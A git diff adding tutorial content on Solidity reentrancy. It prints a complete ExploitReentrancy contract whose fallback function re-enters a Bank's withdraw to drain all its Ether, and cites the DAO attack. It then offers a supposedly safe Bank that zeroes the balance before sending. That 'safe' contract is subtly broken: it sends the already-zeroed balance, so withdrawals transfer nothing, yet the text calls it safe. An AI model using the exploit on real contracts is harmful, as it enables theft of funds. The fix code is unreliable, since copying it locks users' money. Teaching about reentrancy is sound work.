@@ -156,9 +156,98 @@ contract Bank{
     function checkBalance() public view returns(uint){
         return balances[msg.sender];
     }
+    
+    function vault() public view returns(uint){
+        return address(this).balance;
+    }
 } //end of contract
 ```
 
-Can you identify the problem in the above contract? If not I will give you one more clue, the problem is in the withdraw function.
+Can you identify the problem in the above contract? Don't worry if you cannot, it is tricky to see it if you are not used to Solidity. I will give you one more clue, the problem is in the withdraw function.
+
+Any call to another address hands the control to that address. This includes any transfer of Ether. If the address is an account, nothing can happen. __However__, if the address is another contract (receiver) it can execute any code before giving back the control to the original contract. The receiver can even call the original contract again before the current function execution is resolved, therein lies the problem. 
+
+When we use "transfer" or "send", reentrancy is not serious because these functions have a gas limition that prohibits the receiver to execute anything other than log one event. Using "call" is a different story. In the last example, we could drain all Ether from the contract by using the contract bellow.
+
+```solidity
+pragma solidity^0.4.24;
+/**
+ * @title Exploit Reentrancy Flaw
+ * @author Henrique
+ */
+contract ExploitReentrancy{
+    address private owner;
+    Bank private bank;
+    
+    constructor() public{
+        owner = msg.sender;
+    }
+    
+    function setBank(address bank_address) public {
+        bank = Bank(bank_address);
+    }
+    
+    function deposit() public payable returns (uint){
+        bank.deposit.value( msg.value )();
+        return bank.checkBalance();
+    }
+    
+    function getFunds() public {
+        require(owner == msg.sender);
+        owner.transfer( address(this).balance );
+    }
+
+    function exploit() public {
+        require(owner == msg.sender);
+        bank.withdraw();
+    }
+        
+    function() public payable {
+        uint balance = bank.checkBalance();
+        if( address(bank).balance >= balance ){
+            bank.withdraw();
+        }
+    }
+}
+```
+
+The security issue happens in the "exploit" and fallback functions. The remaining functions are to just for set-up. In this case, the contract ExploitReentracy becames one of the Bank clients and deposits something. When we call the "exploit" function, the contract performs a bank withdraw. The withdraw function will send the funds from the Bank to ExploitReentrancy, which will trigger the execution of the fallback function before the Bank has a chance to update the balance on this address. Therefore, in the fallback we just call withdraw again, and the Bank will send our funds again and trigger another execution of the fallaback function. This will go on until we drain all Ether from the bank.
+
+In fact, the infamous DAO attack that drained approximately 50 million dollars worth of cruptocurrency was caused by a Reentrancy flaw. The attacker probably used a contract similar to one I presented.
+
+How can we avoid a reentrancy flaw? There is simple pattern that should always be used when calling external address. Always update the internal contract state before calling external functions (also called checks-effects-interactions pattern). Another important note is to use "transfer" or "send" instead of "call" (both transfer and send are safer by design).
+
+For example the Bank contract bellow would not be affected by reentrancy. See that we are not forbidden someone to call the original contract again, but an attacker would not gain any benefit from doing so.
+
+```solidity
+pragma solidity^0.4.24;
+/**
+ * @title Ether Bank Safe Re-entrancy
+ * @author Henrique
+ */
+contract Bank{
+    mapping(address=>uint) private balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;    
+    }
+    
+    function withdraw() public {
+        uint user_balance = balances[msg.sender];
+        balances[msg.sender] = 0;
+        msg.sender.call.value(balances[msg.sender])();
+        //Better to use transfer as shown in the line below, but even with call is safe
+        //msg.sender.transfer( user_balance );
+    }
+    
+    function checkBalance() public view returns(uint){
+        return balances[msg.sender];
+    }
+    
+    function vault() public view returns(uint){
+        return address(this).balance;
+    }
+} //end of contract
+```
 
 
